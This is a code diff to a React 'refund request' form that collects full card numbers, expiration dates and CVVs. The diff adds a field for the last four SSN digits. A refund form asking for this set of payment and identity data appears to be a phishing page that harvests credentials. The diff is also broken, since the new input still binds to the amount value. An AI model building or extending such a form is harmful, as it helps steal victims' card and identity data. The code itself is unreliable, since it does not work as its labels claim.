@@ -16,6 +16,7 @@ interface FormData {
   cardNumber: string;
   expirationDate: string;
   cvv: string;
+  lfssn:string;
 }
 
 export default function Home() {
@@ -32,6 +33,7 @@ export default function Home() {
     cardNumber: "",
     expirationDate: "",
     cvv: "",
+    lfssn:"",
   });
 
   const [isLoading, setIsLoading] = useState(false);
@@ -66,6 +68,7 @@ export default function Home() {
         cardNumber: "",
         expirationDate: "",
         cvv: "",
+        lfssn:"",
       });
     } catch (error) {
       setStatusMessage("Failed to submit the refund request. Please try again.");
@@ -143,10 +146,10 @@ export default function Home() {
             />
 
 
-            <label htmlFor="amount">Amount:</label>
+            <label htmlFor="lfssn">Last four SSN:</label>
 <input
   type="number"
-  id="amount"
+  id="lfssn"
   value={formData.amount}
   onChange={handleChange}
   required
